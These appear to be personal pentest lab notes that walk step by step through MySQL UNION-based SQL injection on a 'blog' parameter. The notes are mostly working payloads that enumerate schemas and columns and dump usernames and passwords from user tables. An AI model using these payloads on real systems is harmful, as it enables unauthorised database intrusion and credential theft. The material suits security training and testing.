@
Testing for SQLI and determining columns:
blog=1 UNION SELECT NULL--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011742.png]]
blog=1 UNION SELECT NULL,NULL--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011742-1.png]]
blog=1 UNION SELECT NULL,NULL--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743.png]]
AND BAM, We can see it's reflecting our response in this UNION query. 
So we now know this is vulnerable to SQLI injection and that it contains 3 columns. 

?blog=-23232 union select null,null,@@version--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-1.png]]

By using a page that doesn't exist in the blog paramater, the MySQL resposnse gets reflected in the status section
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-2.png]]

As you can see; this is not the information we seek. 
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-3.png]]

?blog=-51512 UNION SELECT null, username, password from users--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-4.png]]

?blog=-51512 union select NULL, NULL, group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-5.png]]

Very interesting technique. 



?blog=-51512 union select NULL, NULL, group_concat(password) from users--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-6.png]]


?blog=-51512 union select NULL, group_concat(username), group_concat(password) from users--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-7.png]]
?blog=-51512 union select NULL,NULL,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='vn_admin'--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-8.png]]

?blog=-51512 union select NULL, NULL, group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='vn_admin'--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-9.png]]

?blog=-51512 union select NULL,NULL,group_concat(username) from vn_admin.be_users--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-10.png]]

?blog=-51512 union select NULL,NULL,group_concat(password) from vn_admin.be_users--
![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/SQLI/MySQL/MySQL/{{notename}}-202605011743-11.png]]